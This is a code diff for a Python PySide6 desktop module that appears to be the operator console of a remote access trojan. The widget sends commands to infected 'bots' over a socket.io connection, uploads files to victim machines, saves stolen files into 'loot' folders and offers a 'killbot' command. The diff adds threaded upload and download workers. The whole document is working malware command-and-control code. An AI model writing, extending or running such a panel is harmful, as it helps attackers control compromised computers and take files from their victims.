@@ -1,7 +1,7 @@
 from PySide6.QtWidgets import QWidget,QCompleter,QFileDialog,QMessageBox
 from PySide6.QtGui import QIcon,QFont,QKeyEvent,QPalette,QColor
 from PySide6.QtCore import Qt,QThread
-from core.file_worker import FileWorker
+from core.file_worker import FileDownloadWorker, FileUploadWorker
 from core.util import PattayaPanelUtil
 from designer.ui_terminal import Ui_BotTerminalWidget
 import json
@@ -33,7 +33,7 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         self.setWindowIcon(QIcon(":/assets/images/rat.png"))
 
         stylesheet = """
-QTextEdit {
+QTextBrowser {
     background-color: #000000;
     color: #FB00FF;
     font-family: 'Terminal', sans-serif;
@@ -87,17 +87,26 @@ QTextEdit {
 
         self.bot_loot_terminal_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "terminal"))
         self.bot_loot_download_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "download"))
+        
 
 
         self.create_loot_dir()
 
         self._file_download_worker_thread = QThread()
-        self._file_download_worker = FileWorker()
+        self._file_upload_worker_thread = QThread()
+
+        self._file_download_worker = FileDownloadWorker()
+        self._file_upload_worker = FileUploadWorker()
 
         self._file_download_worker.moveToThread(self._file_download_worker_thread)
-        self._file_download_worker_thread.started.connect(self._file_download_worker.doWork)
-        self._file_download_worker.progress.connect(self.on_download_file_progress)
+        self._file_upload_worker.moveToThread(self._file_upload_worker_thread)
+
+        self._file_upload_worker_thread.started.connect(self._file_upload_worker.doWorkUpload)
+        self._file_download_worker_thread.started.connect(self._file_download_worker.doWorkDownload)
+
         self._file_download_worker.finished.connect(self.on_download_file_finished)
+        self._file_upload_worker.finished.connect(self.on_upload_file_finished)
+        self._file_upload_worker.error.connect(self.on_upload_file_error)
     
 
     def create_loot_dir(self):
@@ -111,12 +120,23 @@ QTextEdit {
 
 
     def init_terminal(self, data):
+        if self.bot_send_task_line_edit.isEnabled() is not True:
+            self.panel_update_bot_file_upload_failed("Problem occur while operated the command")
+            return
         self.update_bot_terminal(data)
 
     def handle_bot_comamnd(self):
         text = self.bot_send_task_line_edit.text()
         if text == '':
             return
+        
+        args = text.split(" ", 1)
+        command = args[0]
+
+        if (len(args)) == 1:
+            arg = ""
+        else:
+            arg = args[1]
         
         if text == 'help':
             self.update_bot_terminal(text)
@@ -144,9 +164,22 @@ QTextEdit {
             
             incomingFilename = os.path.basename(file_name)
             
-            incomingFile = PattayaPanelUtil.base64_file_encode(file_name)
-            PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{incomingFile}')
-        
+            self._file_upload_worker.setup_data(self.socket_io_client, 
+                                                self.token, 
+                                                self.bot['socketId'], 
+                                                self.bot['hwid'],
+                                                command,
+                                                arg,
+                                                file_name, 
+                                                incomingFilename, 
+                                                self.bot['username']
+                                                )
+            self._file_upload_worker_thread.start()
+            self.update_bot_terminal(text)
+            self.bot_send_task_line_edit.clear()
+            # self.bot_send_task_line_edit.setDisabled(True)
+            return
+
         if text == 'killbot':
             ret = QMessageBox.warning(self, 
                                     "Kill bot warning",
@@ -158,18 +191,6 @@ QTextEdit {
         
         PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
         self.update_bot_terminal(text)
-        args = text.split(" ", 1)
-        command = args[0]
-
-        if (len(args)) == 1:
-            arg = ""
-        else:
-            arg = args[1]
-
-
-        # print(f"[+] Filename: {incomingFilename}")
-        # print(f"[+] file base64: {incomingFile}")
-
 
         bot_task = {
             "panelToken": self.token,
@@ -222,6 +243,25 @@ QTextEdit {
         self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F7810A'> ⮜⮜⮜</font></font><font color='#00E3FA'><br><pre>{result}</pre></font><br>")
         self.task_result_text_browser.ensureCursorVisible()
 
+    def panel_update_bot_file_saved(self, file_path):
+        current_time = datetime.now()
+        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
+        self.task_result_text_browser.append(f"<font color='#ff0080'>[+] [{formatted_time}] File has been saved at {file_path}</font>")
+        self.task_result_text_browser.ensureCursorVisible()
+
+    def panel_update_bot_file_uploaded(self, data):
+        current_time = datetime.now()
+        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
+        self.task_result_text_browser.append(f"<font color='#ff0080'>[+] [{formatted_time}] {data}</font>")
+        self.task_result_text_browser.ensureCursorVisible()
+
+
+    def panel_update_bot_file_upload_failed(self, data):
+        current_time = datetime.now()
+        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
+        self.task_result_text_browser.append(f"<font color='red'>[-] [{formatted_time}] {data}</font>")
+        self.task_result_text_browser.ensureCursorVisible()
+
     def update_bot_terminal(self, command):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
@@ -257,19 +297,27 @@ QTextEdit {
         if key == Qt.Key_Tab:
             self.bot_send_task_line_edit.setCursorPosition(len(self.bot_send_task_line_edit.text()))
 
+    def on_download_file_finished(self, data):
+        self._file_download_worker_thread.quit()
+        self._file_download_worker_thread.wait()
+        self.panel_update_bot_file_saved(data)
 
-    def on_download_file_progress(self):
-        pass
 
-    def on_download_file_finished(self):
-        pass
+    def on_upload_file_finished(self, data):
+        self._file_upload_worker_thread.quit()
+        self._file_upload_worker_thread.wait()
+        self.panel_update_bot_file_uploaded(data)
 
+
+    def on_upload_file_error(self, data):
+        self._file_upload_worker_thread.quit()
+        self._file_upload_worker_thread.wait()
+        self.panel_update_bot_file_upload_failed(data)
 
     def start_file_download_thread(self, file, filename):
-        # self._file_download_worker.setup_data(file, filename, self.bot_loot_download_dir)
-        # self._file_download_worker_thread.start()
+        if file == "" or file is None:
+            return
         self.create_loot_dir()
-        file_path = os.path.join(self.bot_loot_download_dir, filename)
-        decoded_bytes = PattayaPanelUtil.base64_file_decode(file)
-        with io.open(file_path, 'wb') as f:
-            f.write(decoded_bytes)
+        self._file_download_worker.setup_data(file, filename, self.bot_loot_download_dir)
+        self._file_download_worker_thread.start()
+    
